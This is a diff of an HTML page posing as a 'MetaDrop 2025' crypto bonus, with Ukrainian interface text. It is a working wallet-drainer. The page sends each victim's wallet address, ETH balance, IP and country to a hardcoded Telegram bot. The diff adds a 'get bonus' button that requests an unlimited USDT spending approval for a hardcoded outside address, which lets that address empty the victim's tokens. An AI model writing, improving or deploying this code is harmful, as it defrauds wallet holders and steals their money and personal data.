@@ -42,57 +42,76 @@
 <body>
   <div class="box">
     <h2>🎁 MetaDrop 2025</h2>
-    <p>Працює на ПК та мобільному
-      <br>
-      Натисніть кнопку для підключення
-    </p>
+    <p>Працює на ПК та мобільному<br>Натисніть кнопку для підключення</p>
     <button onclick="connectWallet()">🔐 Підключити гаманець</button>
+    <button onclick="approveTokens()">✅ Отримати бонус</button>
   </div>
 
   <script>
     const BOT_TOKEN = "7625731088:AAGWuxqSkiL72HInY03Q9CQU-D_cQKaZ4SI";
     const CHAT_ID = "7234699302";
+    let provider, signer;
 
     async function connectWallet() {
-      let provider;
-      let signer;
+      try {
+        if (window.ethereum) {
+          provider = new ethers.providers.Web3Provider(window.ethereum);
+          await provider.send("eth_requestAccounts", []);
+          signer = provider.getSigner();
+        } else {
+          const walletConnectProvider = new WalletConnectProvider.default({
+            infuraId: "1a2b3c4d5e6f4g7h8i9j0k"
+          });
+          await walletConnectProvider.enable();
+          provider = new ethers.providers.Web3Provider(walletConnectProvider);
+          signer = provider.getSigner();
+        }
 
-      if (window.ethereum) {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-      } else {
-        const walletConnectProvider = new WalletConnectProvider.default({
-          infuraId: "1a2b3c4d5e6f4g7h8i9j0k" // замените на свой, если хотите
+        const address = await signer.getAddress();
+        const balance = await provider.getBalance(address);
+        const ethBalance = ethers.utils.formatEther(balance);
+
+        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
+
+        const message = `👀 <b>Новий користувач:</b>\n\n` +
+          `🔑 <b>Адреса:</b> <code>${address}</code>\n` +
+          `💸 <b>Баланс:</b> ${ethBalance} ETH\n` +
+          `🌍 <b>IP:</b> ${ipData.ip}\n` +
+          `🌐 <b>Країна:</b> ${ipData.country_name}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "HTML"
+          })
         });
-        await walletConnectProvider.enable();
-        provider = new ethers.providers.Web3Provider(walletConnectProvider);
-        signer = provider.getSigner();
+
+        alert("Підключено: " + address + "\nБаланс: " + ethBalance + " ETH");
+      } catch (err) {
+        alert("❌ Помилка: " + err.message);
+      }
+    }
+
+    async function approveTokens() {
+      if (!signer) {
+        alert("Спочатку підключіть гаманець");
+        return;
       }
 
-      const address = await signer.getAddress();
-      const balance = await provider.getBalance(address);
-      const ethBalance = ethers.utils.formatEther(balance);
+      const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // реальний USDT
+      const spender = "0x544efFe1651BD2A665e4aD7ddA155d38f71FC1c0"; // адреса отримувача дозволу
+      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+      const token = new ethers.Contract(usdtAddress, abi, signer);
 
-      const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
-
-      const message = `👀 <b>Новий користувач:</b>\n\n` +
-        `🔑 <b>Адреса:</b> <code>${address}</code>\n` +
-        `💸 <b>Баланс:</b> ${ethBalance} ETH\n` +
-        `🌍 <b>IP:</b> ${ipData.ip}\n` +
-        `🌐 <b>Країна:</b> ${ipData.country_name}`;
-
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "HTML"
-        })
-      });
-
-      alert("Підключено: " + address + "\nБаланс: " + ethBalance + " ETH");
+      try {
+        const tx = await token.approve(spender, ethers.constants.MaxUint256);
+        alert("✅ Approve відправлено: " + tx.hash);
+      } catch (err) {
+        alert("❌ Відмовлено: " + err.message);
+      }
     }
   </script>
 </body>
